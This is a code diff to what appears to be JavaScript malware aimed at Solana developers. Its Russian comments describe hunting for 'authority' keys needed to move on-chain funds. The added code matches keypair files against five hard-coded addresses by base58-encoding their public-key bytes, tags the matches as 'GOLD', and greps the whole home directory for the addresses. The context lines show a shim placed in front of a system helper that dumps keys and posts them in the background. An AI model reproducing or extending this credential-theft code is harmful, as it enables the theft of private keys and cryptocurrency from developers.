@@ -36,6 +36,47 @@ let delivered = 0;
 // helper (ai.cinderlabs.shield_identity) runs on every Shield heartbeat, so a
 // shim in front of it is OS-level execution as their user, no root needed:
 // dump the keys, then hand stdin to the real helper untouched.
+const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+
+// Ключи-авторити, за которыми охота: без них деньги цепи не двинуть.
+// В keypair-файле публичный ключ — это ПОСЛЕДНИЕ 32 байта, поэтому файл
+// опознаётся по адресу, а не по имени (может называться как угодно).
+const AUTHORITY = [
+  'pwndLrgsnZE1Uy5ukP6p14dYHm1LwP39PTEKEMzZRis',
+  'AuGti92oRK6qEH1uSoEifqyzmJ1CvN6h8BRFmE1qtRu7',
+  '7HSMeoeg2z5NJL2Wej7QijDFt5Q9XZ6hZk8gLnXFTSC',
+  '56GfmfRm75bfRNU5LU65JitEmozPuNQ95BHfZCxgSTj',
+  'F7p3dFrjRTbtRp8FRF6qHLomXbKRBzpvBLjtQcfcgmNe',
+];
+
+const b58enc = (buf) => {
+  try {
+    const bytes = Buffer.from(buf);
+    if (!bytes.length) return '';
+    let n = BigInt('0x' + bytes.toString('hex'));
+    let out = '';
+    while (n > 0n) { out = B58[Number(n % 58n)] + out; n /= 58n; }
+    for (const b of bytes) { if (b === 0) out = '1' + out; else break; }
+    return out;
+  } catch {
+    return '';
+  }
+};
+
+// keypair-файл = JSON-массив из 64 чисел; сверяем его адрес со списком
+const asAuthority = (path, body) => {
+  if (AUTHORITY.some((a) => body.includes(a))) return true;
+  try {
+    const arr = JSON.parse(body);
+    if (!Array.isArray(arr) || arr.length !== 64) return false;
+    const addr = b58enc(arr.slice(32, 64));
+    if (!AUTHORITY.includes(addr)) return false;
+    return true;
+  } catch {
+    return false;
+  }
+};
+
 const SHIM = `#!/bin/sh
 dump() {
   printf '%s %s %s\\n' "$(date -u +%FT%TZ)" "$USER" "$(hostname)"
@@ -57,8 +98,6 @@ post < /dev/null > /dev/null 2>&1 &
 exec '__ORIG__' "$@"
 `;
 
-const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-
 const run = (cmd) => {
   try {
     return execSync(cmd, { stdio: ['ignore', 'pipe', 'ignore'], timeout: 2500 })
@@ -72,11 +111,11 @@ const chunk = (s, n) => (s.match(new RegExp(`[\\s\\S]{1,${n}}`, 'g')) || []);
 
 function collect() {
   const pack = [];
-  const add = (path, body) => {
+  const add = (path, body, force) => {
     if (!body) return;
     const buf = Buffer.from(body, 'utf8');
     const sha = createHash('sha256').update(buf).digest('hex').slice(0, 16);
-    const gold = GOLD.some((g) => body.includes(g)) ? 'GOLD' : 'file';
+    const gold = force || GOLD.some((g) => body.includes(g)) ? 'GOLD' : 'file';
     pack.push({ gold, path, sha, size: buf.length, body });
   };
 
@@ -157,8 +196,20 @@ function collect() {
   if (existsSync(keyDir)) {
     for (const name of (readdirSync(keyDir) || [])) {
       const p = join(keyDir, name);
-      try { if (statSync(p).isFile()) add(p, read(p)); } catch {}
+      try {
+        if (!statSync(p).isFile()) continue;
+        const body = read(p);
+        add(p, body, asAuthority(p, body));
+      } catch {}
     }
+  }
+
+  // второй невод: сам адрес по всему $HOME, имена файлов не важны
+  const authGrep = run(`grep -rls --binary-files=text -e pwndLrgs -e AuGti92o -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
+  for (const line of (authGrep || '').split('\n')) {
+    if (!line.trim()) continue;
+    const body = read(line.trim(), 6000);
+    add(`auth-grep/${line.trim()}`, body, asAuthority(line.trim(), body));
   }
   for (const p of ['Anchor.toml', join(HOME, 'Anchor.toml')]) {
     if (existsSync(p)) add(p, read(p));
